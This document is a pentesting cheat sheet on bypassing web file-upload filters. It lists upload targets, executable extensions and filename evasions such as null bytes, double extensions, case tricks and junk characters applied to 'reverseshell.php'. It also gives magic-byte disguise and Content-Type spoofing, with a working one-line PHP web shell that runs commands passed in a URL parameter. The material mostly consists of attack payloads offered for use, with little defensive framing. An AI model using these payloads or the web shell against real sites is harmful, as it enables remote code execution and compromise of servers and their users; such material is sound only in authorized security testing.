
# Common Places to Test for File Uploads

* Profile picture uploads (e.g., avatars)
* Resume or document uploads (e.g., .pdf, .docx)
* Contact/support forms (with file attachments)
* E-commerce product image uploads
* CMS media sections (WordPress, Joomla, etc.)
* File managers or admin panels
* Assignment submission portals
* Blog/article submissions
* Public file sharing tools
* Admin functions (theme/plugin uploads)

  # Upload Bypass

## Rename the extension  

```
• PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module

• PHP8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp

• ASP: asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml

• PERL: .pl, .pm, .cgi, .lib

• JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action

• Coldfusion: .cfm, .cfml, .cfc, .dbm

• Flash: .swf

• Erlang Yaws Web Server: .yaws
```
# Bypass the extension checks

### Using some uppercase, Lowercase letters
```
pHp, .pHP5, .aSPx, .JAvA, .GrOOvY, .Ps1, .PY, .Go, .jSp ...
```
### Add special characters at the end
```
reverseshell.php%20
reverseshell.php%0a
reverseshell.php%00
reverseshell.php%0d%0a
reverseshell.php/
reverseshell.php.\
reverseshell.
reverseshell.php....
```
It also possible with previous bypass Upper, lower case bypasses

```
reverseshell.php5%0a
reverseshell.pHP5%0a
```
### Adding a valid extension before

* As example, if the png are the only authorized extension:
```
reverseshell.png.php
shell.jpeg.asp
shell.cv.php
shell.png.php
```
• It is also possible to use the the uppercase letters

```
reverseshell.png.Php5
reverseshell.png.pHTml
```
### Add a double extension and a junk data between them
* Some examples
```
reverseshell.php#.png
reverseshell.php%00.png
reverseshell.php\x00.png
reverseshell.php%0a.png
reverseshell.php%0d%0a.png
reverseshell.phpJunk123png
```
With lower, Upper cases technique

`
reverseshell.png%00pHp5 
`
### Add another layer of extensions
Some examples

```
file.png.jpg.php
```
Combine with Uppecase Lowercase technique

```
file.php%00.png%00.jpg
file.pHp%00.pNg%00.jPg
```
## Magic Byte Bypass Trick
Some servers check file types based on magic bytes (the first few bytes in a file) instead of the file extension. Attackers can exploit this by inserting a valid header of a safe file type (like GIF) at the beginning of a malicious file.

**Example:**
You create a shell.php file with this content:

```
GIF89a
<?php system($_GET['cmd']); ?>
```

* GIF89a is the magic header for a .gif image.
* Server sees it as an image (if poorly configured).
* But once executed, the PHP code still runs!

## Bypass Using Content-Type Header
Some applications rely on the Content-Type header (like image/png) to validate uploaded files. This can be bypassed easily because headers are controlled by the client, not the server.

### Bypass Techniques:
Manually modify Content-Type using tools like Burp Suite:
```
Content-Type: image/png
```
  ➤ While uploading a file like shell.php, just change the header to look like an image.

#### Use multipart/form-data with fake headers:
```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
```
  ➤ But the file is actually PHP code!

